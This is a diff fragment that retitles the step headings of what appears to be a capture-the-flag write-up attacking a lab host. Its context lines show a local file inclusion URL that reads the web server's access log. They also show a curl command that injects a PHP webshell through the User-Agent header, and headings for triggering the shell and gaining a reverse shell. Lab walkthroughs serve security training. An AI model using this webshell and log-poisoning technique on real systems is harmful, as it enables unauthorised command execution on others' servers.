@@ -260,7 +260,7 @@ view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
 
 <br />
 
-### 2 - Send a curl request that injects a PHP webshell into the User-Agent header.
+### 2 - Inject PHP webshell via User-Agent header.
 
 <br />
 
@@ -286,7 +286,7 @@ curl -s -X GET "http://10.10.10.84/" -H 'User-Agent: <?php system($_GET[100]); ?
 
 <br />
 
-### 3 - Use LFI to include the log file and run a command.
+### 3 - Trigger webshell via LFI.
 
 <br />
 
@@ -305,7 +305,7 @@ As we can see, the command was successfully executed.
 
 <br />
 
-### 4 - Reverse shell.
+### 4 - Gain reverse shell.
 
 <br />
 
